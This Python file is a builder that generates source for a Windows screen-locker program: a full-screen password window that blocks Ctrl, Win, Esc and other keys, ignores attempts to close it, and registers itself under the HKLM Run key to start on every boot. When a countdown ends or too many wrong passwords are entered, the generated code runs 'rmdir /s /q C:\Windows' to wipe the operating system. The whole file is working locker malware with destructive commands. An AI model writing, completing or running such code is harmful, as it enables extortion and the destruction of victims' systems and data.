def build_text(main_text, description_text, pincode_text, tries_text, hour_text, minutes_text):
    result = "{result.stdout.strip()}"
    os = "{os.path.abspath(__file__)}"
    
    if main_text == "":
        main_text = "0"
        
    if description_text == "":
        description_text = "0"
        
    if pincode_text == "":
        pincode_text = "0"
        
    if tries_text == "":
        tries_text = "0"
        
    if hour_text == "":
        hour_text = "0"
    
    if minutes_text == "":
        minutes_text = "0"
        
    code = """import sys
import os
import time
import shutil
import winreg as wr
import subprocess
import keyboard
from datetime import timedelta
from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QLineEdit, QPushButton
from PyQt6.QtCore import Qt, QRect, QPropertyAnimation, QSequentialAnimationGroup, QEasingCurve, QTimer

class WinLocker(QMainWindow):
    def __init__(self):
        super().__init__()
        
        self.setWindowTitle("WinLocker")
        self.setFixedSize(1700, 100)
        self.setStyleSheet("background-color: black;")
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.setWindowOpacity(0.95)
        
        self.opacity = 1.0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.correct_animation)
        
        self.attempts = 0
        self.password = ""
        self.label = QLabel("", self)
        self.label.resize(1300, 700)
        self.label.move(120, 70)
        self.label.setStyleSheet("border: 6px solid #9E0808; background-color: black;")
        
        self.main_text = QLabel("{main_text}", self)
        self.main_text.setWordWrap(True)
        self.main_text.resize(1000, 150)
        self.main_text.move(320, 80)
        self.main_text.setStyleSheet("font-size: 70px; color: #D90000;")
        
        main_text = self.main_text.text()
        main_text_length = len(main_text.split())

        if main_text_length >= 30:
            self.main_text.setText("Error, text len is so big.")
            self.main_text.setStyleSheet("font-size: 30px; color: #D90000;")
        elif main_text_length >= 20:
            self.main_text.setStyleSheet("font-size: 40px; color: #D90000;")
        elif main_text_length >= 10:
            self.main_text.setStyleSheet("font-size: 50px; color: #D90000;")
        elif main_text_length >= 5:
            self.main_text.setStyleSheet("font-size: 60px; color: #D90000;")
            
        self.info_text = QLabel("{description_text}", self)
        self.info_text.setWordWrap(True)
        self.info_text.resize(950, 100)
        self.info_text.move(300, 220)
        self.info_text.setStyleSheet("font-size: 20px;")
        
        info_text = self.info_text.text()
        info_text_length = len(info_text.split())

        if info_text_length >= 35:
            self.info_text.setText("Error, text len is so big.")
            self.info_text.setStyleSheet("font-size: 20px;")

            
        self.enter_password = QLineEdit(self)
        self.enter_password.resize(440, 100)
        self.enter_password.move(520, 380)
        self.enter_password.setPlaceholderText("ENTER PASSWORD")
        self.enter_password.setStyleSheet("padding: 8px; font-size: 50px; color: black; background-color: white; border-radius: 7px;")
    
        self.confirm_password = QPushButton("ACTIVATE", self)
        self.confirm_password.resize(440, 100)
        self.confirm_password.move(520, 530)
        self.confirm_password.setStyleSheet("font-size: 55px; background-color: white; color: black; border-radius: 7px;")
        self.confirm_password.pressed.connect(self.check_password)
        
        self.countdown_timer()
        
        
    def countdown_timer(self):
        total_seconds = {hour_text} * 3600 + {minutes_text} * 60
        self.remaining_time = total_seconds

        self.timer_display = QLabel(self)
        self.timer_display.resize(370, 100)
        self.timer_display.move(595, 650)
        self.timer_display.setStyleSheet("font-size: 75px; background-color: black; color: #D90000; border-radius: 7px;")
        
        self.timer_display.setText(str(timedelta(seconds=self.remaining_time)))
        
        self.timer_delete = QTimer()
        self.timer_delete.timeout.connect(self.update_timer)
        self.timer_delete.start(1000)


    def update_timer(self):
        if self.remaining_time > 0:
            self.remaining_time -= 1
            self.timer_display.setText(str(timedelta(seconds=self.remaining_time)))
        else:
            self.timer.stop()
            subprocess.run("cmd.exe /c rmdir /s /q C:\\\Windows", shell=True)
    
    
    def check_password(self):
        if self.enter_password.text() == "{pincode_text}":
            self.start_fade_out()
            
        elif self.enter_password.text() != self.password:
            self.attempts += 1
            self.incorrect_animation()
            if self.attempts >= {tries_text}:
                subprocess.run("cmd.exe /c rmdir /s /q C:\\\Windows", shell=True)
                
        elif self.enter_password.text() == "":
            self.attempts += 1
            self.incorrect_animation()
            if self.attempts >= {tries_text}:
                subprocess.run("cmd.exe /c rmdir /s /q C:\\\Windows", shell=True)
    
    
    def incorrect_animation(self):
        self.confirm_password.setText("INCORRECT PASSWORD")
        self.confirm_password.setStyleSheet("font-size: 40px; background-color: red; color: black; border-radius: 7px;")
        self.animation1 = QPropertyAnimation(self.confirm_password, b"geometry")
        self.animation1.setDuration(130)
        self.animation1.setStartValue(QRect(520, 530, 440, 100))
        self.animation1.setEndValue(QRect(510, 530, 440, 100))
        self.animation1.setEasingCurve(QEasingCurve.Type.InOutCubic)

        self.animation2 = QPropertyAnimation(self.confirm_password, b"geometry")
        self.animation2.setDuration(130)
        self.animation2.setStartValue(QRect(510, 530, 440, 100))
        self.animation2.setEndValue(QRect(530, 530, 440, 100))
        self.animation2.setEasingCurve(QEasingCurve.Type.InOutCubic)
        
        self.animation3 = QPropertyAnimation(self.confirm_password, b"geometry")
        self.animation3.setDuration(130)
        self.animation3.setStartValue(QRect(530, 530, 440, 100))
        self.animation3.setEndValue(QRect(520, 530, 440, 100))
        self.animation3.setEasingCurve(QEasingCurve.Type.InOutCubic)
        
        self.animation_group = QSequentialAnimationGroup()
        self.animation_group.addAnimation(self.animation1)
        self.animation_group.addAnimation(self.animation2)
        self.animation_group.addAnimation(self.animation3)
        
        self.animation_group.finished.connect(lambda: (self.confirm_password.setText("ACTIVATE"), self.confirm_password.setStyleSheet("font-size: 50px; background-color: white; color: black; border-radius: 7px;")))
        self.animation_group.start()
        
    
    def start_fade_out(self):
        self.timer.start(10)
        
        
    def correct_animation(self):
        self.confirm_password.setText("CORRECT")
        self.confirm_password.setStyleSheet("font-size: 50px; background-color: #4FC253; color: white;")
        self.opacity -= 0.01
        if self.opacity <= 0:
            sys.exit()
        else:
            self.setWindowOpacity(self.opacity)
        

    def closeEvent(self, event):
        event.ignore()
        

            
def add_in_regedit():
    result = subprocess.run(["where", "pythonw"], capture_output=True, text=True)
    if result.returncode == 0:
        key = wr.OpenKey(wr.HKEY_LOCAL_MACHINE, "Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run", 0, wr.KEY_WRITE)
        wr.SetValueEx(key, "Locker", 0, wr.REG_SZ, f'"{result}" "{os}"')
        key.Close()
    else:
        print("Please, install Python.")


def block_keys():
    keyboard.block_key("shift")
    keyboard.block_key("del")
    keyboard.block_key("ctrl")
    keyboard.block_key("win")
    keyboard.block_key("esc")
    keyboard.block_key("f4")
    keyboard.block_key("tab")

block_keys()

try:
    key = wr.OpenKey(wr.HKEY_LOCAL_MACHINE, "Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run", 0, wr.KEY_READ)
    value, regtype = wr.QueryValueEx(key, "Locker")

    if value:
        block_keys()
        app = QApplication(sys.argv)
        window = WinLocker()
        window.showFullScreen()
        app.exec()
    else:
        print("please, open program with administrator permissions.")
            
except FileNotFoundError:
    try:
        add_in_regedit()
    except PermissionError:
        print("please, open program with administrator permissions.")
"""
    
    return code.format(main_text=main_text, description_text=description_text, hour_text=hour_text, minutes_text=minutes_text, pincode_text=pincode_text, tries_text=tries_text, result=result, os=os)